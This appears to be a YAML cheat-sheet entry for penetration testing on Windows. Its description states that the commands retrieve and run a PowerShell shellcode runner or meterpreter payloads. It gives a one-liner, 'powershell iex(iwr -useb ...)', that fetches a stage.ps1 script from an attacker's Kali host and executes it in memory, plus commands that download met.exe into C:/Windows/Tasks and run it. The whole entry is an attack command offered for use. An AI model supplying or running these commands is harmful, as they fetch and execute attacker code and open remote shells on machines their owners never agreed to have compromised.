---
description: |
  This command can be executed from the command line of a Windows machine. It retrieves the ps1-file (could also be a txt-file) holding commands that will be executed. This can be useful running Powershell shellcode runner or downloading and executing meterpreter payloads.

  Command Reference:
  ```
  IP address of kali machine: 10.10.10.1

  stage.ps1: file containing commands 

  ```
command: |
  powershell iex(iwr -useb 10.10.10.1/stage.ps1)

code: |
  iwr 10.10.10.1/met.exe -O C:/Windows/Tasks/met.exe
  C:/Windows/Tasks/met.exe 

items:
  - Shell
services:
  - 
OS:
  - Windows
attack_types:
  - General
references:
  -
---